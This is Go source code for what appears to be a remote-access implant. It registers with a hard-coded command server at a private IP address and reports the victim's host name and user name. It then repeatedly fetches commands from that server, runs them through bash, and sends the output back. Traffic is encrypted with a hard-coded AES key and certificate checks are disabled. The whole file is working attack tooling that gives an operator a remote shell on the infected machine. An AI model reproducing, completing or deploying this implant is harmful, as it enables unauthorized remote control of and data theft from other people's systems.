package main

import (
    "strings"
	//"bytes"
	"crypto/tls"
    "io/ioutil"
    "net/http"
	//"net/url"
	"math/rand"
	"encoding/base64"
	"crypto/aes"
	"os/user"
	"os"
	"os/exec"
    "time"
	"fmt"
	"strconv"
)

var ConfigTarget = "https://192.168.0.105:8443"
var ConfigIniUrl = "/AgentName/"
var ConfigGetAgentShell = "/AgentShell/"
var ConfigPostResults = "/PostResults/"
var ConfigSleep = 5
var Configkey = []byte("ac59075b964b0715")

func GetAgentName(length int) string {
	str := "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	bytes := []byte(str)
	result := []byte{}
	rand.Seed(time.Now().UnixNano()+ int64(rand.Intn(100)))
	for i := 0; i < length; i++ {
		result = append(result, bytes[rand.Intn(len(bytes))])
	}
	return string(result)
}

func GetComputerName() string {
	name,err := os.Hostname()
	if err == nil{
		return string(name)
	}
	return string("NULL")
}

func GetUserName() string {
	name,err := user.Current()
	if err == nil {
		return string(name.Username)
	}
	return string("NULL")
}


func AesEncryptECB(origData []byte, key []byte) (encrypted []byte) {
	cipher, _ := aes.NewCipher(generateKey(key))
	length := (len(origData) + aes.BlockSize) / aes.BlockSize
	plain := make([]byte, length*aes.BlockSize)
	copy(plain, origData)
	pad := byte(len(plain) - len(origData))
	for i := len(origData); i < len(plain); i++ {
		plain[i] = pad
	}
	encrypted = make([]byte, len(plain))
	// 分组分块加密
	for bs, be := 0, cipher.BlockSize(); bs <= len(origData); bs, be = bs+cipher.BlockSize(), be+cipher.BlockSize() {
		cipher.Encrypt(encrypted[bs:be], plain[bs:be])
	}

	return encrypted
}
func AesDecryptECB(encrypted []byte, key []byte) (decrypted []byte) {
	cipher, _ := aes.NewCipher(generateKey(key))
	decrypted = make([]byte, len(encrypted))
	//
	for bs, be := 0, cipher.BlockSize(); bs < len(encrypted); bs, be = bs+cipher.BlockSize(), be+cipher.BlockSize() {
		cipher.Decrypt(decrypted[bs:be], encrypted[bs:be])
	}

	trim := 0
	if len(decrypted) > 0 {
		trim = len(decrypted) - int(decrypted[len(decrypted)-1])
	}

	return decrypted[:trim]
} 
func generateKey(key []byte) (genKey []byte) {
	genKey = make([]byte, 16)
	copy(genKey, key)
	for i := 16; i < len(key); {
		for j := 0; j < 16 && i < len(key); j, i = j+1, i+1 {
			genKey[j] ^= key[i]
		}
	}
	return genKey
}
func FunCmd(command []string) string{
	var t = ""
	for i := 1; i < len(command); i++{
		t = t + " " + command[i];
	}
	fmt.Println(t)
	cmd := exec.Command("/bin/bash", "-c", t)
	stdout, _ := cmd.StdoutPipe()
    if err := cmd.Start(); err != nil{
        fmt.Println("Execute failed when Start:" + err.Error())
        return ""
    }
 
    out_bytes, _ := ioutil.ReadAll(stdout)
    stdout.Close()
 
    if err := cmd.Wait(); err != nil {
        fmt.Println("Execute failed when Wait:" + err.Error())
        return ""
    }
    return string(out_bytes)
}

func FunSleep(command []string) string{
	IntSleep,_ := strconv.Atoi(command[1])
	ConfigSleep = IntSleep
	StringSleep := strconv.Itoa(ConfigSleep)
	return string("Sleep: " + StringSleep)
}

func Run(command []string) string{
	var MethodName = command[0]
	switch
	{
		case MethodName== "sleep":
			return FunSleep(command);
		case MethodName == "shell":
			return FunCmd(command);
		default:
			break;
	}
	return string("Command not found");
}

func Get(target string) string {

	tr := &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Timeout: 10 * time.Second,Transport:tr}
    resp, err := client.Get(target)
    if err != nil {
        return string("error")
    }
    defer resp.Body.Close()
	result, err := ioutil.ReadAll(resp.Body)
	DecodeResult,err := base64.StdEncoding.DecodeString(string(result))
	if err !=nil {
		return string("NUll")
	}
	decrypted := AesDecryptECB(DecodeResult, Configkey)
    return string(decrypted)
}

var proxyConf = "127.0.0.1:8080"
func Post(target string, data string) string {
	var EnData []byte = []byte(data)
	encrypted := AesEncryptECB(EnData, Configkey)

    // proxyAddr := "http://127.0.0.1:8080/"
    // proxy, err := url.Parse(proxyAddr)
    // if err != nil {
    // }
    netTransport := &http.Transport{
        //Proxy:http.ProxyURL(proxy),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
    }
    client := &http.Client{Timeout: 10 * time.Second,Transport:netTransport}
    resp, err := client.Post(target,"application/x-www-form-urlencoded",strings.NewReader(base64.StdEncoding.EncodeToString(encrypted)))
    if err != nil {
        return string("NUll")
    }
    defer resp.Body.Close()
    result, _ := ioutil.ReadAll(resp.Body)
	DecodeResult,err := base64.StdEncoding.DecodeString(string(result))
	if err !=nil {
		return string("NUll")
	}
	decrypted := AesDecryptECB(DecodeResult, Configkey)
    return string(decrypted)
}

func main(){
	var AgetName = GetAgentName(16)
	var AgentDetails = AgetName + "|" + GetComputerName() + "|" + GetUserName()
	sum :=0
	for{
		sum ++
		if sum>0 {
			InitResults := Post(ConfigTarget+ConfigIniUrl+AgetName,AgentDetails)
			fmt.Println(InitResults)
			if InitResults == "NUll" && InitResults != "ok"{
				time.Sleep(time.Duration(ConfigSleep)*time.Second)
				continue
			}
			fmt.Println("InitResults")
			for i := 1; i >0; i++ {
				ShellResults := Get(ConfigTarget+ConfigGetAgentShell+AgetName)
				if ShellResults == "error"{
					break
				}
				if ShellResults != "NUll" && len([]rune(ShellResults))>0 {
					Command := strings.Fields(ShellResults)
					results := Run(Command)
					Post(ConfigTarget+ConfigPostResults+AgetName,results)
				}
				time.Sleep(time.Duration(ConfigSleep)*time.Second)
			}
			
		}
	}
}